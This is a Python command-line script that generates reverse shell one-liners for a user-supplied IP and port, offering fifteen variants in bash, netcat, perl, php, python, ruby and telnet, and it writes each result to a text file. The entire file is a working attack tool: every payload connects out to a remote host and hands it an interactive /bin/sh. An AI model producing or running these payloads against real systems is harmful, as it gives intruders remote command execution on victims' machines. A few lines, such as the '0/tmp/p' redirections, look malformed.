#!/usr/bin/env python
import sys
import os
import socket
import re

methods=['bash','bash2','netcat','netcat2','netcat3','netcat4','perl','perl2','perl3','php','python','ruby','ruby2','ruby3','telnet']

def GREEN(text):
    return "\033[32m{}\033[0m".format(str(text))

def usage():
    print("python reversegen.py <Method> <IP> <Port>\n")
    print("Methods available:")
    print(" - " + GREEN("bash"))
    print(" - " + GREEN("bash2"))
    print(" - " + GREEN("netcat"))
    print(" - " + GREEN("netcat2"))
    print(" - " + GREEN("netcat3"))
    print(" - " + GREEN("netcat4"))
    print(" - " + GREEN("perl"))
    print(" - " + GREEN("perl2"))
    print(" - " + GREEN("perl3"))
    print(" - " + GREEN("php"))
    print(" - " + GREEN("python"))
    print(" - " + GREEN("ruby"))
    print(" - " + GREEN("ruby2"))
    print(" - " + GREEN("ruby3"))
    print(" - " + GREEN("telnet"))
    print("Each method explained in detail in the README.")
    
    sys.exit()

# Validations

if (len(sys.argv) != 4): usage()
elif (str(sys.argv[1]) not in methods): usage()
elif (not (1 <= int(sys.argv[3]) <= 65535)):
    print("That port can't be used!")
    sys.exit()

# Variables

method = str(sys.argv[1])

if (re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$",str(sys.argv[2]))):
    ip = str(sys.argv[2])
else:
    ip = socket.gethostbyname(str(sys.argv[2]))

port = str(sys.argv[3])

# Opens file

filename = method + "_reverse_" + ip + "_" + port + ".txt"
file = open(filename,'w')

# Selects method

if(method == 'bash'):
    data = "bash -i >& /dev/tcp/" + ip + "/" + port +" 0>&1"

if(method == 'bash2'):
    data = "0<&196;exec 196<>/dev/tcp/" + ip + "/" + port + "; sh <&196 >&196 2>&196"

elif(method == 'netcat'):
    data = "nc -e /bin/sh "+ ip + " " + port

elif(method == 'netcat2'):
    data = "/bin/sh | nc " + ip + " " + port

elif(method == 'netcat3'):
    data = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + port + " >/tmp/f"

elif(method == 'netcat4'):
    data = "rm -f /tmp/p; mknod /tmp/p p && nc " + ip + " " + port + " 0/tmp/p"

elif(method == 'perl'):
    data = "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

elif(method == 'perl2'):
    data = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"" + ip + ":" + port + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

elif(method == 'perl3'):
    data = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"" + ip + ":" + port + "\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

elif(method == 'php'):
    data = "php -r '$sock=fsockopen(\"" + ip + "\"," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

elif(method == 'python'):
    data = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

elif(method == 'ruby'):
    data = "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + port + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

elif(method == 'ruby2'):
    data = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"" + ip + "\",\"" + port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

elif(method == 'ruby3'):
    data = " ruby -rsocket -e 'c=TCPSocket.new(\"" + ip + "\",\"" + port + "\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"

elif(method == 'telnet'):
    data = "rm -f /tmp/p; mknod /tmp/p p && telnet " + ip + " " + port + " 0/tmp/p"

# Writes to file and prints out

file.write(data)
file.close()
print(data)
